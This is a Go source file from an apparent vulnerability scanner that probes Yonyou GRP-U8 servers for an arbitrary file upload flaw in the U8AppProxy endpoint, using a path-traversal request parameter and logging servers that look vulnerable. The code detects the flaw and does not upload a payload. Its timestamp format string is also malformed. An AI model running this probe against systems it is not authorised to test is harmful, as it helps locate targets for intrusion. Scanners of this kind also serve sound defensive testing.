package Scan

import (
	"FoPoForYonyou2.0/Utils"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"time"
)

func U8AppProxyScan(address string, client *http.Client, Red string, Green string, Yellow string, Reset string, Cyan string, currentTime string) {
	U8AppProxy := "用友 GRP-U8 U8AppProxy 任意文件上传漏洞"
	urls := address + "/U8AppProxy?gnid=myinfo&id=saveheader&zydm=../../yongyouU8_test"
	response, _ := client.Get(urls)
	defer response.Body.Close()

	bodywaf2, _ := ioutil.ReadAll(response.Body)
	if response.StatusCode == http.StatusInternalServerError || response.StatusCode == http.StatusMethodNotAllowed || response.StatusCode == http.StatusUnsupportedMediaType {
		if strings.Contains(string(bodywaf2), "GIF89a") || strings.Contains(string(bodywaf2), "aliyun") || strings.Contains(string(bodywaf2), "waf") {
			output := fmt.Sprintf("["+Cyan+"%s"+Reset+"] ["+Yellow+"-"+Reset+"] 不存在%s ", currentTime, U8AppProxy)
			fmt.Println(output)
		} else {
			result14 := U8AppProxy + "：" + urls
			//保存文件不能用传来的currentTime，得重新定义一个格式的时间戳
			timestamp := time.Now().Format("20230712")
			filename := fmt.Sprintf("scan_result_%s.txt", timestamp)
			err := Utils.SaveResultToFile(result14, filename)
			if err != nil {
				log.Println("保存结果到文件出错:", err)
			} else {

			}
			output := fmt.Sprintf("["+Green+"%s"+Reset+"] ["+Green+"+"+Reset+"] 存在%s：%s", currentTime, U8AppProxy, urls)
			fmt.Println(output)
		}
	} else {
		output := fmt.Sprintf("["+Cyan+"%s"+Reset+"] ["+Yellow+"-"+Reset+"] 不存在%s ", currentTime, U8AppProxy)
		fmt.Println(output)
	}
}
